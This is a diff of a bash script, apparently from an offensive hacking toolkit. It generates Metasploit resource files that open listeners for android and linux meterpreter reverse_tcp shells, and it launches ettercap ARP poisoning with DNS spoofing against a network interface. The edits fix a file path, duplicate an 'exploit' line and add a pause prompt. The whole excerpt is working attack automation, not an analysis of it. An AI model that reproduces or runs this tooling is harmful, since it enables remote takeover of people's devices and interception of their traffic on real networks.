@@ -154,7 +154,8 @@ echo
 			echo "set payload android/meterpreter/reverse_tcp" >> tools/msfrc/Listening2.rc
 			echo "set LHOST $lhost" >> tools/msfrc/Listening2.rc
 			echo "set LPORT 5555" >> tools/msfrc/Listening2.rc
-			echo "exploit" >> tools/Listening2.rc
+			echo "exploit" >> tools/msfrc/Listening2.rc
+			echo "exploit" >> tools/msfrc/Listening2.rc
 			echo "use exploit/multi/handler" > tools/msfrc/Listening3.rc
 			echo "set payload linux/x64/meterpreter/reverse_tcp" >> tools/msfrc/Listening3.rc
 			echo "set LHOST $lhost" >> tools/msfrc/Listening3.rc
@@ -221,7 +222,7 @@ echo
 	pre=$?
 	if [ "$pre" == 0 ]
 		then
-		echo ""
+		
 	else
 		echo "Sorry somethings was wrong ..."
 		echo
@@ -229,7 +230,8 @@ echo
 		clear
 	fi
 	read -p "Enter your Interface: " Interface
-	xterm -e ettercap -T -q -M arp:remote -P dns_spoof -i $Interface ////
+	xterm -hold -e ettercap -T -q -M arp:remote -P dns_spoof -i $Interface ////
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
 	opre=$?
 	if [ "$opre" == 0 ]
 		then
